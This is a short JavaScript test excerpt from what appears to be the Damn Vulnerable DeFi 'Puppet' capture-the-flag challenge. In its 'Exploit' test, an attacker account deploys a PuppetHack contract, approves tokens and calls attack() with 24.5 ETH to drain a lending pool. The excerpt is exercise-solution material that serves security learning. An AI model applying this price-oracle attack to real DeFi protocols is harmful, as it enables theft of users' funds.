...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        const PuppetHackFactory = await ethers.getContractFactory('PuppetHack', attacker);
        const puppetHack = await PuppetHackFactory.deploy(this.lendingPool.address,this.token.address, this.uniswapExchange.address, attacker.address);
        await this.token.connect(attacker).approve(puppetHack.address, POOL_INITIAL_TOKEN_BALANCE);
        await puppetHack.attack({value: ethers.utils.parseEther('24.5') });
    });
